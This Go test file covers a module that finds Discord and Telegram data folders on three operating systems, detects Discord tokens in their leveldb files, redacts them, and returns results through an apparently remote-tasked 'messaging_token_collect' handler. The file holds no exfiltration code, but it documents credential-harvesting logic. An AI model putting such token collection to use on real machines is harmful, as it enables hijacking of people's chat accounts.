//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestMessagingClientsPerPlatform(t *testing.T) {
	win := messagingClients("windows", "C:\\Users\\u", "C:\\Users\\u\\AppData\\Roaming")
	if len(win) != 2 || !strings.Contains(win[0].label, "Discord") {
		t.Fatalf("windows clients = %v", win)
	}
	mac := messagingClients("darwin", "/Users/u", "")
	if len(mac) != 2 || !strings.Contains(mac[0].dirs[0], "Application Support") {
		t.Fatalf("darwin clients = %v", mac)
	}
	lin := messagingClients("linux", "/home/u", "")
	if len(lin) != 2 || !strings.Contains(lin[1].dirs[0], "TelegramDesktop") {
		t.Fatalf("linux clients = %v", lin)
	}
}

func TestLooksLikeDiscordToken(t *testing.T) {
	classic := "123456789012345678.abcdefgh.ABCD" + strings.Repeat("x", 30)
	if !looksLikeDiscordToken(classic) {
		t.Fatal("classic token not detected")
	}
	if !looksLikeDiscordToken("dQw4w9WgXcQ:some-obfuscated-blob") {
		t.Fatal("obfuscated token not detected")
	}
	for _, bad := range []string{"", "hello world", "1.2.3", strings.Repeat("a", 100)} {
		if looksLikeDiscordToken(bad) {
			t.Fatalf("false positive: %q", bad)
		}
	}
}

func TestRedactToken(t *testing.T) {
	tok := "123456789012345678.secretpart.verylonghmac"
	got := redactToken(tok)
	if strings.Contains(got, "secretpart") || !strings.HasPrefix(got, "123456") {
		t.Fatalf("token not redacted: %q", got)
	}
	if got := redactToken("short"); strings.Contains(got, "short") {
		t.Fatalf("short token not redacted: %q", got)
	}
}

func TestCollectMessagingFromClientsBounded(t *testing.T) {
	root := t.TempDir()
	ldb := filepath.Join(root, "Discord", "Local Storage", "leveldb")
	if err := os.MkdirAll(ldb, 0o755); err != nil {
		t.Fatal(err)
	}
	classic := "123456789012345678.abcdefgh." + strings.Repeat("z", 32)
	if err := os.WriteFile(filepath.Join(ldb, "file_0.log"), []byte("noise\n"+classic+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	// Symlink to an outside file with a token — must not be followed.
	outside := filepath.Join(root, "secret.log")
	if err := os.WriteFile(outside, []byte(classic), 0o644); err != nil {
		t.Fatal(err)
	}
	_ = os.Symlink(outside, filepath.Join(ldb, "link.log"))

	report := collectMessagingFromClients([]messagingClient{{label: "Discord", dirs: []string{ldb}}})
	if !strings.Contains(report, "Discord") || !strings.Contains(report, "token 123456") {
		t.Fatalf("report missing redacted hit: %s", report)
	}
	if strings.Contains(report, "secretpart") || strings.Count(report, "token ") != 1 {
		t.Fatalf("symlink followed or token duplicated: %s", report)
	}
}

func TestMessagingHandleBase64(t *testing.T) {
	var res TaskResult
	handleMessagingTokenCollect(Task{Type: "messaging_token_collect"}, &res)
	if res.Encoding != "base64" || res.Output == "" {
		t.Fatalf("bad envelope: %q %q", res.Encoding, res.Output)
	}
	if _, err := base64.StdEncoding.DecodeString(res.Output); err != nil {
		t.Fatal(err)
	}
}
